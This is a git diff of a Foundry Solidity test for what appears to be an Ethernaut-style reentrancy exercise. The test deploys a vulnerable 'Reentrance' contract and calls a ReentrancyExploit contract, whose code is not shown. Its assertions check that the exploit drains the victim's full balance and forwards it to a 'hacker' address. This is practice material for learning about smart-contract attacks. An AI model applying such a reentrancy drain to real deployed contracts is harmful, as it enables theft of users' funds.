@@ -24,13 +24,7 @@ contract ReentrancyTest is Test {
 
         level = new Reentrance();
         level.donate{value: initialVictimBalance}(instance);
-
-        assert(hacker.balance == initialDeposit);
-        assert(instance.balance == initialVictimBalance);
-        assert(address(level).balance == initialVictimBalance);
-
     }
-    
 
     function testReentrancyHack() public {
 
@@ -38,24 +32,28 @@ contract ReentrancyTest is Test {
 
         exploit = new ReentrancyExploit(level);
         
-        exploit.exploit{value: initialDeposit}();
-        //assert(address(exploit).balance == 0);
-        //assert(hacker.balance == 0);
-        //assert(instance.balance == initialVictimBalance);
-        //assert(address(level).balance == initialVictimBalance + initialDeposit);
-        //assert(level.balanceOf(address(exploit)) == initialDeposit);
-        
+        /////////////////////////////
+        // drain the victim contract
+        /////////////////////////////
 
-        exploit.withdraw();
-        //assert(address(exploit).balance == initialDeposit);
-        //assert(hacker.balance == 0);
-        //assert(instance.balance == initialVictimBalance);
-        //assert(address(level).balance == initialVictimBalance);
-        //assert(level.balanceOf(address(exploit)) == 0);
+        assert(hacker.balance == initialDeposit);
+        assert(instance.balance == initialVictimBalance);
+        assert(address(level).balance == initialVictimBalance);
+        assert(address(exploit).balance == 0);
+
+        exploit.run{value: initialDeposit}();
+        assert(address(exploit).balance == initialVictimBalance + initialDeposit);
+        assert(hacker.balance == 0);
+
+        ///////////////////////////////////////////
+        // withdraw from ReentrancyExploit contract
+        ///////////////////////////////////////////        
         
-        
-        console.log(address(exploit).balance);
-        console.log(hacker.balance);
+        bool success = exploit.withdrawToHacker();
+        assert(success);
+        assert(hacker.balance == initialVictimBalance + initialDeposit);
+        assert(address(exploit).balance == 0);
+
         vm.stopPrank();
         
     }
